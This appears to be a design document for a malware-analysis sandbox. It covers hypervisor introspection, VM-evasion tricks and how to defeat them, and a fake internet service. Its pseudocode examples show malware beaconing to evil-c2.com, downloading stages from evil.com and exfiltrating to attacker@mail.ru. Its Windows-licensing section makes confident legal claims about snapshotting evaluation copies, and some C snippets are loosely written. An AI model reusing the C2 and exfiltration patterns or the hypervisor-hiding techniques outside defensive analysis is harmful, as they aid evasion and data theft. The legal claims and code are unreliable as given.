│  ┌──────────────────▼───────────────────────────┐  │
│  │  QEMU/KVM Guest VM                           │  │
│  │                                               │  │
│  │  Windows/Linux kernel                         │  │
│  │  ← syscall hooks are INVISIBLE to guest →     │  │
│  │  No agent process, no files, no drivers       │  │
│  │  Malware sees a clean, unmonitored system     │  │
│  └──────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────┘
```

**EPT Hook Technique (Shadow Pages)**
```
1. Clone target code page containing NtCreateFile
2. In the clone, replace first bytes with INT3 (breakpoint)
3. Create alternate EPT view:
   - Execute permission → points to clone (with INT3)
   - Read/Write permission → points to original (clean code)
4. When guest executes NtCreateFile → INT3 fires → VMexit
5. VMI engine reads guest registers (syscall arguments)
6. When guest reads the same memory → sees original bytes (no INT3)
7. PatchGuard, anti-hook scanners see clean, unmodified code
```

This is the same technique used by:
- **DRAKVUF** (Xen-based, open source, Tamas K Lengyel)
- **VMRay** (commercial, $100K+/year)
- **CrowdStrike Falcon Sandbox** (commercial)
- **Joe Sandbox** (commercial, hypervisor-level hooks)

#### Tier 3 — Direct Hypervisor Control

V1 uses QEMU as a black box. V2 can control the hypervisor directly:

**macOS — Hypervisor.framework (Apple's native API)**
```c
// Direct VM creation — no QEMU process needed for simple VMs
#include <Hypervisor/hv.h>

hv_return_t ret = hv_vm_create(HV_VM_DEFAULT);     // Create VM
hv_vcpu_t vcpu;
hv_vcpu_create(&vcpu, HV_VCPU_DEFAULT);             // Create vCPU
hv_vm_map(guest_memory, guest_addr, size, flags);    // Map memory
hv_vcpu_run(vcpu);                                   // Execute

// Read registers after VMexit
uint64_t rip, rax;
hv_vcpu_read_register(vcpu, HV_X86_RIP, &rip);
hv_vcpu_read_register(vcpu, HV_X86_RAX, &rax);
```
- ~10ms VM boot time (vs ~30s for QEMU full boot)
- Direct register/memory access for VMI
- No QEMU installation required on macOS

**Linux — KVM ioctl (Direct Kernel API)**
```c
int kvmfd = open("/dev/kvm", O_RDWR);
int vmfd = ioctl(kvmfd, KVM_CREATE_VM, 0);

// Map guest memory — mmap'd region, direct access from host
void *mem = mmap(NULL, MEM_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
struct kvm_userspace_memory_region region = {
    .slot = 0,
    .guest_phys_addr = 0,
    .memory_size = MEM_SIZE,
    .userspace_addr = (uint64_t)mem,
};
ioctl(vmfd, KVM_SET_USER_MEMORY_REGION, &region);

// Dirty page tracking — see exactly which pages malware modified
struct kvm_dirty_log dirty = { .slot = 0 };
dirty.dirty_bitmap = calloc(MEM_SIZE / 4096 / 8, 1);
ioctl(vmfd, KVM_GET_DIRTY_LOG, &dirty);
```
- Dirty page tracking: know exactly which memory pages malware modified
- Direct EPT manipulation for syscall hooking
- vCPU event injection for anti-evasion

#### Tier 4 — Advanced Capabilities

**Intel Processor Trace (PT)**
```c
// Hardware instruction-level tracing — ~2% overhead
// Records every branch, call, return at CPU speed
struct perf_event_attr attr = {
    .type = intel_pt_type,  // from /sys/bus/event_source/devices/intel_pt/type
    .config = 0,
    .size = sizeof(attr),
};
int fd = perf_event_open(&attr, -1, cpu, -1, 0);

// Decode trace packets → complete instruction flow
// See every API call, every branch decision, every loop iteration
// Malware cannot detect or evade hardware tracing
```
- Complete branch recording at ~2% overhead
- Impossible for malware to detect (hardware, not software)
- Captures timing-based evasion attempts (sleep loops, RDTSC checks)

**Dirty Page Tracking**
- KVM's `KVM_GET_DIRTY_LOG` returns a bitmap of every 4KB page modified by the guest
- After sample execution, instantly know which memory regions were modified
- Detect code unpacking: page marked dirty → read new contents → detect unpacked payload
- Detect process hollowing: track which pages of a legitimate process were overwritten

**Multi-VM Orchestration**
```
┌─────────────────────────────────────────────────────────┐
│  ShieldTier V2 — Multi-VM Analysis                      │
│                                                          │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  │
│  │  VM 1         │  │  VM 2         │  │  VM 3         │  │
│  │  Win 10 22H2  │  │  Win 11 23H2  │  │  Ubuntu 22.04 │  │
│  │  x64, 4GB     │  │  x64, 4GB     │  │  x64, 2GB     │  │
│  │  Office 2019  │  │  Office 365   │  │  LibreOffice   │  │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘  │
│         │                  │                  │          │
│         └────────── VMI Engine ──────────────┘          │
│                      │                                   │
│              Unified Event Stream                        │
│              Comparative Analysis                        │
│              "Ran same sample on 3 OS — different        │
│               behaviors detected"                        │
└─────────────────────────────────────────────────────────┘
```
- Detonate same sample across multiple OS versions simultaneously
- Compare behaviors — malware that only triggers on specific OS/locale
- Anti-evasion: if malware refuses to run on one VM, the others catch it

**Anti-Evasion (CPUID Masking, TSC Manipulation)**
```c
// Malware commonly checks CPUID for hypervisor presence:
// CPUID leaf 0x1, ECX bit 31 = hypervisor present
// V2 can mask this bit:
struct kvm_cpuid_entry2 entries[100];
ioctl(vcpufd, KVM_GET_CPUID2, &cpuid);
for (int i = 0; i < cpuid.nent; i++) {
    if (entries[i].function == 1) {
        entries[i].ecx &= ~(1 << 31);  // Hide hypervisor bit
    }
}
ioctl(vcpufd, KVM_SET_CPUID2, &cpuid);

// TSC (Time Stamp Counter) manipulation:
// Malware detects VMs by measuring CPUID execution time
// V2 can offset TSC to hide VM overhead:
struct kvm_tsc_offset tsc = { .offset = -overhead_cycles };
```

#### Tier 5 — Enterprise-Grade Features

These match VMRay/CrowdStrike/Joe Sandbox:

| Feature | Description | V1 | V2 |
|---------|------------|----|----|
| Agentless monitoring | EPT-based syscall hooks, invisible to guest | No | Yes |
| Full syscall trace | Every NtCreateFile, NtWriteFile, NtSetValueKey, etc. | No | Yes |
| Kernel object tracking | EPROCESS, PEB, TEB, VAD tree walking | No | Yes |
| Network simulation | Full TCP/TLS/DNS/SMTP/FTP fake services | Partial | Full |
| PCAP generation | Complete packet capture from virtual NIC | No | Yes |
| Memory forensics | Volatility-style analysis on live guest RAM | No | Yes |
| Snapshot diffing | Compare filesystem/registry before vs after | No | Yes |
| API call graph | Visual call flow of all hooked APIs | No | Yes |
| Dropped file extraction | Pull files written by malware from guest FS | No | Yes |
| C2 protocol detection | Identify C2 beaconing patterns in network traffic | Basic | Advanced |
| Anti-evasion score | Measure how much malware tried to evade analysis | No | Yes |
| Execution timeline | Microsecond-precision event ordering | ~500ms | ~1μs |
| Multi-OS parallel | Same sample on 3+ OS simultaneously | No | Yes |
| Custom OS images | User-provided VM images for specific environments | Partial | Full |

### V2 VM Architecture — Host Isolation Model

**The VM sandbox NEVER touches the host system.** Complete isolation:

```
┌──────────────────────────────────────────────────────────────────┐
│  HOST SYSTEM                                                      │
│                                                                    │
│  ShieldTier V2 Process (unprivileged user process)                │
│  ├── CEF Browser Engine                                           │
│  ├── Analysis Engine (C++)                                        │
│  └── VM Sandbox Engine                                            │
│       │                                                            │
│       ├── Hypervisor API (HVF / KVM)                              │
│       │    └── Hardware-enforced memory isolation (EPT/NPT)       │
│       │                                                            │
│       ├── QEMU (when direct hypervisor not available)             │
│       │    └── restrict=on (zero real network access)             │
│       │                                                            │
│       ├── INetSim (runs inside ShieldTier process)                │
│       │    └── Fake DNS + HTTP + SMTP + FTP                       │
│       │    └── All traffic stays in virtual network                │
│       │                                                            │
│       └── VMI Engine (reads guest memory from host side)          │
│            └── Read-only introspection — never injects into guest │
│                                                                    │
│  DATA FLOW:                                                        │
│  Host → Guest: Sample file (read-only VVFAT virtual drive)       │
│  Guest → Host: Structured JSON events (virtio-serial)            │
│  Guest → Network: NOTHING (restrict=on, no NAT, no bridge)       │
│  Guest → Host FS: NOTHING (no shared folders)                     │
│  Guest → Host Memory: NOTHING (EPT hardware isolation)           │
└──────────────────────────────────────────────────────────────────┘
```

**Platform-Specific Sandboxing:**
- **macOS**: App Sandbox entitlements + Hardened Runtime + com.apple.security.hypervisor
- **Linux**: seccomp-bpf + mount namespaces + cgroup resource limits + no CAP_NET_RAW
- **Windows**: Job Objects + restricted token + firewall rules (block QEMU outbound)

### V2 VM Implementation Phases

| Phase | Scope | Weeks |
|-------|-------|-------|
| VM-1 | Fix V1 bugs: real process monitoring, working DNS, accurate scoring | 2 |
| VM-2 | Direct hypervisor integration (HVF macOS, KVM Linux) | 3 |
| VM-3 | Agentless VMI — EPT hooks for syscalls, invisible monitoring | 4 |
| VM-4 | Full network simulation (TCP/TLS/SMTP/FTP/DNS), PCAP generation | 2 |
| VM-5 | Memory forensics, snapshot diffing, dropped file extraction | 3 |
| VM-6 | Intel PT integration, anti-evasion (CPUID, TSC, RDTSC) | 2 |
| VM-7 | Multi-VM orchestration, comparative analysis | 2 |
| VM-8 | API call graph visualization, execution timeline UI | 2 |
| **Total** | | **20 weeks** |

### Anti-Evasion Architecture

Modern malware has dozens of VM detection tricks. V1 gets caught by the most basic check. V2 implements 5 levels of anti-evasion that match VMRay and CrowdStrike Falcon Sandbox.

#### How Malware Detects VMs

**Hardware Fingerprinting**

| Check | What malware looks for |
|-------|----------------------|
| CPUID leaf 0x1 bit 31 | Hypervisor present bit — instant detection |
| CPUID leaf 0x40000000 | Hypervisor vendor string ("KVMKVMKVM", "VBoxVBoxVBox") |
| MAC address prefix | 52:54:00 = QEMU, 08:00:27 = VirtualBox |
| SMBIOS/DMI strings | "QEMU", "VirtualBox", "VMware" in BIOS vendor, board name |
| ACPI tables | QEMU-specific DSDT/RSDT signatures |
| PCI device IDs | Virtio devices (1AF4:xxxx), VMware SVGA (15AD:0405) |
| Disk model string | "QEMU HARDDISK", "VBOX HARDDISK" |
| GPU name | "Red Hat QXL", "VMware SVGA", "VirtualBox Graphics" |

**Timing Attacks**

| Check | What malware does |
|-------|------------------|
| RDTSC around CPUID | VM exit takes ~1000+ cycles, bare metal takes ~200 |
| RDTSC around IN port | VMware backdoor port 0x5658 causes VM exit |
| Sleep then check time | Sleep(10min) — sandboxes often fast-forward or timeout |
| NTP vs local clock | If system clock was manipulated to skip sleep |

**Environment Checks**

| Check | What malware looks for |
|-------|----------------------|
| Process list | VBoxService.exe, vmtoolsd.exe, qemu-ga.exe, agent binaries |
| File system | C:\Program Files\VMware\, /usr/bin/VBoxClient |
| Registry keys | HKLM\SOFTWARE\VMware, HKLM\SYSTEM\*\Services\VBox* |
| Username | "sandbox", "malware", "analyst", "admin" |
| Desktop files | Empty desktop = sandbox. Real users have files |
| Browser history | Empty = sandbox. Real users have history |
| Recent documents | None = sandbox |
| Screen resolution | 1024x768 default = sandbox |
| RAM / CPU cores | < 4GB RAM or 1 core = probably sandbox |
| Uptime | < 10 minutes = fresh VM = sandbox |
| Mouse movement | No mouse movement = automated sandbox |
| Installed software | No Office, no Chrome, no real apps = sandbox |

**Advanced Evasion**

| Technique | How it works |
|-----------|-------------|
| Geofencing | Only runs if IP is in target country |
| Active Directory check | Only runs if joined to a domain |
| Language check | Only runs if system language matches target |
| Time bomb | Sleeps 30 days before executing payload |
| User interaction required | Waits for mouse click, scroll, or keypress |
| Document close trigger | Payload runs only when user closes the document |

#### V2 Anti-Evasion: 5 Levels

**Level 1 — Hardware Fingerprint Masking**

```
┌─────────────────────────────────────────────────────────┐
│  V2 Anti-Evasion Layer (C++ hypervisor control)         │
│                                                          │
│  CPUID Masking                                          │
│  ├── Clear hypervisor bit (leaf 0x1, ECX bit 31)       │
│  ├── Remove hypervisor vendor string (leaf 0x40000000)  │
│  ├── Spoof CPU brand to match real Intel/AMD            │
│  └── Return real cache/TLB info                         │
│                                                          │
│  Device Masking                                          │
│  ├── MAC address → random realistic vendor prefix       │
│  ├── Disk model → "Samsung SSD 970 EVO Plus"           │
│  ├── SMBIOS → real Dell/HP/Lenovo board strings        │
│  ├── GPU → "Intel UHD Graphics 630"                    │
│  └── ACPI tables → patched to remove QEMU signatures   │
│                                                          │
│  Network Masking                                         │
│  ├── DHCP hostname → realistic PC name                  │
│  └── INetSim returns real-looking geo IP responses      │
└─────────────────────────────────────────────────────────┘
```

**Level 2 — Timing Attack Defeat**

```c
// TSC (Time Stamp Counter) offsetting
// Problem: CPUID takes ~200 cycles on bare metal, ~1000+ in VM
// Solution: offset TSC to hide the VM exit overhead

// After every VM exit, adjust TSC:
uint64_t exit_start = rdtsc();
handle_vmexit(vcpu);  // process the exit
uint64_t exit_cost = rdtsc() - exit_start;

// Subtract exit cost from guest's TSC view
vcpu->tsc_offset -= exit_cost;
// Guest sees: RDTSC before + RDTSC after = ~200 cycles (normal)
```

Makes RDTSC-based timing checks return bare-metal results even though we're in a VM.

**Level 3 — Environment Realism**

```
┌─────────────────────────────────────────────────────────┐
│  Realistic VM Environment (Pre-configured images)        │
│                                                          │
│  Desktop                                                 │
│  ├── 15-20 files (documents, photos, shortcuts)         │
│  ├── Recycle Bin with 3-5 deleted files                 │
│  └── Wallpaper set to default Windows wallpaper         │
│                                                          │
│  Installed Software                                      │
│  ├── Chrome with 50+ history entries                    │
│  ├── Microsoft Office (or LibreOffice)                  │
│  ├── Adobe Reader, 7-Zip, Notepad++                    │
│  ├── Slack or Teams (shortcut only)                     │
│  └── Steam or Spotify (shortcut only)                   │
│                                                          │
│  User Profile                                            │
│  ├── Username: "john.mitchell" (realistic name)         │
│  ├── Computer name: "DESKTOP-A8K2JF3" (Windows-style)  │
│  ├── Recent Documents: 10-15 fake docs                  │
│  ├── Browser cookies/bookmarks: pre-populated           │
│  └── Outlook profile with fake emails                   │
│                                                          │
│  System                                                  │
│  ├── 4+ CPU cores, 8GB+ RAM                            │
│  ├── 1920x1080 resolution                               │
│  ├── Uptime: spoofed to 3-7 days                        │
│  ├── Windows domain-joined (fake AD)                    │
│  └── Timezone + language matching target region          │
└─────────────────────────────────────────────────────────┘
```

**Level 4 — Human Simulation**

```
┌─────────────────────────────────────────────────────────┐
│  Automated Human Behavior (runs during analysis)         │
│                                                          │
│  Mouse: random realistic movements + clicks              │
│  Keyboard: occasional keystrokes (not robotic patterns)  │
│  Scrolling: random page scrolls in open windows          │
│  Window focus: switches between apps periodically        │
│  File opens: opens/closes random documents               │
│  Wait triggers: clicks "Enable Content" on Office docs   │
│  Close triggers: closes document after 30-60s            │
│                                                          │
│  All injected via hypervisor-level input injection       │
│  (KVM_SET_IRQCHIP / PS2 emulation)                      │
│  — NOT via an agent — malware can't distinguish from     │
│    real human input                                       │
└─────────────────────────────────────────────────────────┘
```

**Level 5 — Agentless = Invisible**

| V1 (Agent-based) | V2 (Agentless VMI) |
|-------------------|---------------------|
| `vm-agent` process visible in task list | No process — monitoring is from host side |
| Agent binary on guest filesystem | No files on guest filesystem |
| Agent uses CPU/RAM (detectable timing) | Zero guest resource usage |
| Agent can be killed by malware | Nothing to kill |
| Agent network traffic (virtio-serial) | VMI reads memory directly, no guest I/O |
| Detectable by heuristics | **Invisible** — no artifact exists in guest |

#### Anti-Evasion Effectiveness

| Evasion Level | Detects V1 | Detects V2 |
|---------------|-----------|-----------|
| Basic (CPUID check) | Yes | **No** — masked |
| Medium (process list, files, registry) | Yes | **No** — agentless |
| Advanced (timing, MAC, SMBIOS) | Yes | **No** — TSC offset, spoofed hardware |
| Expert (environment realism) | Yes | **No** — pre-populated realistic images |
| Nation-state (cache side-channel) | Yes | **Maybe** — this is the frontier |

V1 gets caught by the most basic check. V2 survives everything except the most sophisticated nation-state techniques — on par with VMRay and CrowdStrike Falcon Sandbox.

---

### INetSim — The Foundation of Anti-Evasion

INetSim (Internet Services Simulation) is the fake internet inside the VM. Without it, **all other anti-evasion is useless** — malware that can't reach the internet simply refuses to run.

#### Why INetSim Is Critical for Anti-Evasion

Most malware does connectivity checks before executing its payload:

```
Malware startup sequence:
─────────────────────────
1. DNS lookup "google.com"          → Does DNS work?
2. HTTP GET http://google.com       → Am I online?
3. HTTP GET https://icanhazip.com   → What's my public IP?
4. Check IP geolocation             → Am I in the target country?
5. IF all checks pass → execute payload
6. IF any check fails → sleep / exit / self-delete
```

**Without INetSim** (blocked network):
```
1. DNS lookup "google.com"    → TIMEOUT / NXDOMAIN
2. Malware: "No internet = sandbox. I'm not running."
3. Malware exits. Analysis gets NOTHING.
```

**With INetSim:**
```
1. DNS lookup "google.com"    → 10.0.2.100 ✓ (INetSim resolves it)
2. HTTP GET google.com        → 200 OK ✓ (INetSim serves a page)
3. GET icanhazip.com          → "185.92.xx.xx" ✓ (INetSim returns fake public IP)
4. Geo-check                  → Target country ✓ (fake IP in correct range)
5. Malware: "Internet works, I'm on a real machine. Executing payload."
6. Full kill chain runs → ShieldTier captures EVERYTHING
```

#### INetSim Architecture

```
┌──────────────────────────────────────────────────────┐
│  Guest VM (malware running)                           │
│                                                       │
│  malware.exe tries:                                   │
│  1. DNS lookup → "evil-c2.com"                       │
│  2. HTTPS GET → https://evil-c2.com/beacon           │
│  3. SMTP → send stolen data to attacker@mail.ru      │
│  4. FTP → upload screenshots to ftp.exfil.net        │
│  5. DNS TXT → encoded C2 commands via DNS tunneling  │
└──────────┬───────────────────────────────────────────┘
           │ all traffic (restrict=on, no real internet)
           ▼
┌──────────────────────────────────────────────────────┐
│  ShieldTier INetSim (runs inside ShieldTier process)  │
│                                                       │
│  DNS Server (UDP 53)                                  │
│  ├── ALL queries resolve to INetSim's fake IP        │
│  ├── "evil-c2.com" → 10.0.2.100 (INetSim)          │
│  ├── "google.com"  → 10.0.2.100 (INetSim)          │
│  ├── Records every query (domain, type, timestamp)   │
│  └── Detects DNS tunneling (TXT/CNAME exfil)        │
│                                                       │
│  HTTP/HTTPS Server (TCP 80/443)                       │
│  ├── Accepts ANY request to ANY hostname             │
│  ├── Returns realistic responses based on extension: │
│  │   .exe → fake PE binary (triggers download chain) │
│  │   .dll → fake DLL                                 │
│  │   .pdf → fake PDF                                 │
│  │   .doc → fake document                            │
│  │   .zip → fake archive                             │
│  │   .js  → fake JavaScript                          │
│  │   *    → generic HTML page                        │
│  ├── TLS with auto-generated cert for any hostname   │
│  ├── Records: URL, method, headers, POST body        │
│  └── Captures C2 beacon patterns                     │
│                                                       │
│  SMTP Server (TCP 25/587)                             │
│  ├── Accepts ALL emails from malware                 │
│  ├── Records: from, to, subject, body, attachments   │
│  └── Captures exfiltrated data                       │
│                                                       │
│  FTP Server (TCP 21)                                  │
│  ├── Accepts ANY login credentials                   │
│  ├── Allows uploads (captured in memory)             │
│  └── Records: credentials, filenames, file contents  │
│                                                       │
│  DNS-over-HTTPS (TCP 443, /dns-query)                │
│  ├── Catches DoH attempts to bypass DNS logging      │
│  └── Same fake resolution as UDP DNS                 │
└──────────────────────────────────────────────────────┘
```

#### Specific Evasion Techniques INetSim Defeats

**1. Connectivity Gate (90%+ of malware)**
```
// Malware code:
if (!canResolve("google.com")) exit();
if (httpGet("http://www.msftconnecttest.com/connecttest.txt") != "Microsoft Connect Test") exit();
```
INetSim returns valid DNS + HTTP responses. Malware passes its own check.

**2. C2 Check-In Gate**
```
// Malware contacts C2 before activating:
response = httpPost("https://evil-c2.com/gate.php", { "id": botId });
if (response.status != 200) exit();
config = decrypt(response.body);
```
INetSim responds 200 OK with a body. Malware thinks C2 is alive. The decryption attempt itself reveals the encryption method and key to our analysis.

**3. Geo-Fencing**
```
// Only attacks users in Germany:
ip = httpGet("https://api.ipify.org");
geo = httpGet("https://ipapi.co/" + ip + "/country/");
if (geo != "DE") exit();
```
INetSim returns a German IP address and matching geo response. V2 makes this configurable per analysis — pick which country to simulate.

**4. Domain Fronting / CDN Check**
```
// Verifies real internet by checking CDN:
response = httpGet("https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js");
if (response.length < 1000) exit();
```
INetSim serves realistic file sizes for known extensions. `.js` gets a real-looking JavaScript response.

**5. DNS Tunneling C2**
```
// Encodes commands in DNS queries:
cmd = dnsQuery("TXT", base64(botId) + ".evil-c2.com");
```
INetSim DNS returns fake TXT records. Malware decodes them (revealing its protocol). ShieldTier logs the encoded data — exposing the full C2 protocol structure.

**6. Time-Bomb + Connectivity**
```
// Sleeps 48 hours, then checks internet, then runs:
Sleep(48 * 60 * 60 * 1000);
if (!canResolve("bing.com")) exit();
executePayload();
```
V2 accelerates guest clock (hypervisor-level TSC manipulation) — 48 hours passes in seconds. When malware wakes up and checks DNS, INetSim is still there responding.

**7. Multi-Stage Download Chain**
```
Stage 1 (dropper):   downloads stage2.dll from https://evil.com/payload.dll
Stage 2 (loader):    downloads stage3.exe from https://cdn.evil.com/final.exe
Stage 3 (payload):   executes actual ransomware/stealer
```
Without INetSim — stage1 can't download stage2, chain breaks at step 1.
With INetSim — every download gets a response. Malware reveals every URL in its download chain, exposing the full infrastructure.

#### Intelligence INetSim Captures

| Malware action | What INetSim captures | Intelligence gained |
|---------------|----------------------|-------------------|
| DNS lookup `evil-c2.com` | Domain name, query type | C2 infrastructure |
| GET `/beacon?id=ABC123` | Full URL, headers, bot ID | C2 protocol structure |
| POST credentials to C2 | Stolen data in POST body | What data was targeted |
| SMTP to `attacker@mail.ru` | Email with exfil payload | Exfiltration method + recipient |
| FTP upload `screenshots.zip` | File contents | What malware collected |
| DNS TXT `encoded.evil.com` | Tunneled data | C2 commands / exfil via DNS |
| Downloads stage2.exe | URL path + headers | Kill chain stages |
| Checks `icanhazip.com` | Connectivity check pattern | Evasion behavior |

#### INetSim: V1 vs V2

| Service | V1 | V2 |
|---------|----|----|
| DNS (UDP 53) | Working | Working + tunneling detection |
| HTTP (TCP 80) | Working | Working + adaptive responses |
| HTTPS (TCP 443) | Working | Working + per-hostname certs |
| SMTP (TCP 25/587) | Not implemented | Full fake mail server |
| FTP (TCP 21) | Not implemented | Full fake FTP |
| IRC (TCP 6667) | Not implemented | For legacy botnet C2 |
| DNS tunneling detection | Not implemented | Detects encoded TXT/CNAME/MX |
| DoH/DoT interception | Not implemented | Catches DNS-over-HTTPS/TLS |
| Protocol detection | Not implemented | Identifies unknown protocols on any port |
| Adaptive responses | Basic static files | Dynamic responses to keep malware engaged |
| PCAP generation | Not implemented | Full packet capture |
| C2 pattern matching | Not implemented | Beacon interval, jitter, encoded payload detection |
| Geo-IP spoofing | Not implemented | Configurable per-analysis country simulation |
| Multi-stage tracking | Not implemented | Track stage1 → stage2 → stage3 chains |

#### The Core Principle

```
INetSim's role in anti-evasion:

  Block network    →  Malware detects sandbox  →  Refuses to run  →  Zero intel
                                    vs
  INetSim fakes    →  Malware thinks it's real →  Full execution  →  Complete intel
  everything             internet                   of kill chain
```

INetSim is not a separate feature from anti-evasion — it IS the foundation. Without it, CPUID masking, TSC offsetting, and environment realism don't matter because the malware would already have quit at the connectivity check.

---

### Windows Host Platform Support

V2 must run on Windows as a host OS. macOS has Hypervisor.framework, Linux has KVM — Windows has WHPX.

#### Windows Hypervisor Platform (WHPX)

```c
// Windows equivalent of HVF/KVM — user-mode VM control API
#include <WinHvPlatform.h>

WHV_PARTITION_HANDLE partition;
WHvCreatePartition(&partition);
WHvSetPartitionProperty(partition, WHvPartitionPropertyCodeProcessorCount, &one, sizeof(one));
WHvSetupPartition(partition);

// Map guest memory
WHvMapGpaRange(partition, hostMemory, guestAddr, size,
    WHvMapGpaRangeFlagRead | WHvMapGpaRangeFlagWrite | WHvMapGpaRangeFlagExecute);

// Create vCPU + run
WHvCreateVirtualProcessor(partition, 0, 0);
WHvRunVirtualProcessor(partition, 0, &exitContext, sizeof(exitContext));

// Read registers after VMexit
WHV_REGISTER_NAME regs[] = { WHvX64RegisterRip, WHvX64RegisterRax };
WHV_REGISTER_VALUE values[2];
WHvGetVirtualProcessorRegisters(partition, 0, regs, 2, values);
```

#### WHPX Requirements

```
┌─────────────────────────────────────────────────────────┐
│  Windows Hypervisor Stack                                │
│                                                          │
│  ShieldTier V2 (user-mode process)                      │
│       │                                                  │
│       ├── WHPX API (WinHvPlatform.dll)                  │
│       │    └── Requires Hyper-V to be ENABLED            │
│       │                                                  │
│       └── QEMU with WHPX acceleration                   │
│            └── Falls back to TCG (software) if no WHPX  │
│                                                          │
│  Requirements:                                           │
│  ├── Windows 10/11 Pro/Enterprise/Education (NOT Home)  │
│  ├── Hyper-V enabled in Windows Features                │
│  ├── Virtualization enabled in BIOS (VT-x/AMD-V)       │
│  └── Windows Home: NO Hyper-V, NO WHPX, TCG only       │
└─────────────────────────────────────────────────────────┘
```

#### VMI Limitations on Windows

WHPX exposes VM control but **not full EPT manipulation**:
- No equivalent of KVM's direct EPT hook APIs
- No public API for shadow page tables
- No LibVMI port for WHPX
- Microsoft's Hyper-V uses these internally but doesn't expose them

**V2 Windows Monitoring Strategy (Hybrid):**

| Approach | Description |
|----------|-------------|
| Improved ETW agent | Real Windows kernel providers (not WMIC polling like V1) |
| WHPX exit trapping | Trap I/O ports, MSR access, specific instructions |
| Hardware debug registers | DR0-DR3 via WHPX (4 simultaneous breakpoints) |
| Dirty page tracking | WHvQueryGpaRangeDirtyBitmap |
| CPUID/TSC masking | Via WHPX API |

#### TCG Fallback (Windows Home)

TCG (software emulation) is slower but has a silver lining — **better anti-evasion:**

| Feature | WHPX (hardware) | TCG (software) |
|---------|-----------------|----------------|
| Speed | Native | ~10x slower |
| CPUID masking | Via WHPX API | **Complete** — emulates every instruction |
| TSC manipulation | Limited API | **Perfect** — controls virtual TSC entirely |
| Instruction tracing | Not exposed | **TCG plugins** — trace every instruction |
| VM detection | Possible (timing) | **Harder** — no hardware timing artifacts |

#### Platform Feature Matrix

| Feature | macOS HVF | Linux KVM | Windows WHPX | Windows TCG |
|---------|-----------|-----------|-------------|-------------|
| VM boot time | ~10ms | ~10ms | ~10ms | ~30s |
| Agentless VMI | Full | Full | Partial (hybrid) | Via TCG plugins |
| CPUID masking | Yes | Yes | Yes | Yes (better) |
| TSC offsetting | Yes | Yes | Yes | Yes (better) |
| Dirty pages | Yes | Yes | Yes | Via TCG |
| Intel PT | Yes | Yes | No (Hyper-V conflicts) | N/A |
| INetSim | Identical | Identical | Identical | Identical |
| Anti-evasion | Excellent | Excellent | Excellent | Excellent |
| Human simulation | Yes | Yes | Yes | Yes |
| Multi-VM | Yes | Yes | Yes | Limited (slow) |

---

### Guest OS Licensing — Windows Images

#### The Problem

ReactOS (V1's default "Windows" guest) is **not real Windows**:
- Different `ntdll.dll` / `kernel32.dll` internals — malware detects it
- Missing .NET Framework, COM, WMI — malware that uses these fails
- Different PEB version reporting — malware checks `PEB->OSMajorVersion`
- Malware specifically checks for ReactOS and refuses to run

For real malware analysis, you need real Windows.

#### Industry Standard: Windows Evaluation + Snapshot Restore

Every malware sandbox vendor uses the same legal approach:

**Microsoft provides free evaluation copies of Windows:**

| Edition | Duration | Download |
|---------|---------|----------|
| Windows 10 Enterprise Evaluation | 90 days | Microsoft Evaluation Center |
| Windows 11 Enterprise Evaluation | 90 days | Microsoft Evaluation Center |
| Windows Server 2022 Evaluation | 180 days | Microsoft Evaluation Center |

Fully functional — same kernel, same APIs, same everything. Provided by Microsoft specifically for testing and evaluation.

**The Snapshot Trick — Clock Never Advances:**

```
Day 1: Install Windows Evaluation (90-day trial)
       Configure environment (Office, Chrome, fake user profile)
       Take VM snapshot → "golden image"

Every analysis:
  1. Restore to golden image (back to Day 1 state)
  2. Inject malware sample
  3. Run analysis (30-120 seconds)
  4. Capture results
  5. Destroy VM state

The evaluation timer NEVER reaches Day 2.
Every analysis starts from the exact same Day 1 snapshot.
Windows never expires because time never moves forward in the VM.
```

This is not a crack or bypass — the VM genuinely is on Day 1 every time. The activation timer is part of the OS state, restored with the snapshot.

**Legal basis:** Microsoft's evaluation terms allow use for testing purposes. Malware analysis in a sandbox is legitimate testing and security research.

#### Who Uses This Approach

| Vendor | Method | Price |
|--------|--------|-------|
| Cuckoo Sandbox | "Use Windows evaluation ISO" (official docs) | Free / open source |
| Any.Run | Windows evaluation + snapshot | $200-$5000/yr |
| Joe Sandbox | Windows evaluation images | $4000+/yr |
| FLARE VM (Mandiant) | Built on Windows evaluation | Free |
| Triage (Hatching) | Windows evaluation | $300+/yr |
| Cape Sandbox | Windows evaluation + snapshot | Free / open source |
| VMRay | Ships pre-configured Windows evaluation | $100K+/yr |

Every single one. Industry standard.

#### V2 Guest OS Strategy

```
┌─────────────────────────────────────────────────────────────┐
│  ShieldTier V2 — Guest OS Strategy                          │
│                                                              │
│  Tier 1: Built-in (Zero Setup)                              │
│  ├── Alpine Linux 3.19 — ships with ShieldTier (tiny)       │
│  └── ReactOS 0.4.15 — ships with ShieldTier (free)         │
│       └── Good for basic analysis, not full Windows compat  │
│                                                              │
│  Tier 2: One-Click Download (Recommended)                   │
│  ├── Windows 10 Enterprise Evaluation                       │
│  │   ├── Downloaded from Microsoft via ShieldTier UI        │
│  │   ├── User sees Microsoft's EULA → accepts              │
│  │   ├── Auto-installed + configured as golden image        │
│  │   ├── Pre-populated with realistic environment           │
│  │   │   (desktop files, Chrome, Office, fake user)         │
│  │   └── Snapshot taken → used for all future analyses      │
│  │                                                           │
│  ├── Windows 11 Enterprise Evaluation                       │
│  │   └── Same flow as above                                 │
│  │                                                           │
│  └── Ubuntu 22.04 / 24.04 LTS                              │
│       └── Free, downloaded and configured automatically     │
│                                                              │
│  Tier 3: Bring Your Own (Advanced Users)                    │
│  ├── User provides their own ISO + license key              │
│  ├── Corporate volume licenses (common in SOC teams)        │
│  ├── MSDN / Visual Studio subscription licenses             │
│  └── Custom OS images for specific investigation needs      │
└─────────────────────────────────────────────────────────────┘
```

#### Automated Unattended Install

ShieldTier builds the golden image automatically — no manual Windows setup:

```
┌─────────────────────────────────────────────────────────┐
│  Unattended Windows Install (autounattend.xml)           │
│                                                          │
│  Phase 1 — Windows Setup (automated)                    │
│  ├── Skip EULA prompt (evaluation doesn't need key)     │
│  ├── Skip OOBE (Out-of-Box Experience)                  │
│  ├── Create user "john.mitchell" (realistic name)       │
│  ├── Set computer name "DESKTOP-A8K2JF3"               │
│  ├── Set timezone to analysis target region              │
│  ├── Disable Windows Update (sandbox doesn't need it)   │
